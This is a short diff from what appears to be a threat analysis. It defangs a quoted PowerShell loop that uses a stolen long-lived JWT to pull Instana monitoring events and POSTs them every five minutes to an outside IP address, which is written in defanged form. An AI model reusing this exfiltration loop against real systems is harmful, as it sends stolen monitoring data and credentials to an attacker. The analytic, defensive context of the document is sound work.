@@ -567,11 +567,11 @@ The stolen 10-year JWT is hardcoded into the PowerShell script. The `Authorizati
     $events = Invoke-RestMethod -Uri "$instanaUrl/api/events?from=$fromTs&to=$toTs&limit=100" `
                                 -Headers $headers `
                                 -SkipCertificateCheck
-    Invoke-RestMethod -Uri "hxxp://209[.]38[.]205[.]158:8096/api/ingest/instana" `
+    [I]nvoke-RestMethod -Uri "hxxp://209[.]38[.]205[.]158:8096/api/ingest/instana" `
                       -Method POST `
                       -Body ($events | ConvertTo-Json -Depth 10) `
                       -ContentType "application/json"
-    Start-Sleep -Seconds 300  # 5-minute cadence
+    [S]tart-Sleep -Seconds 300  # 5-minute cadence
 }
 ```
 
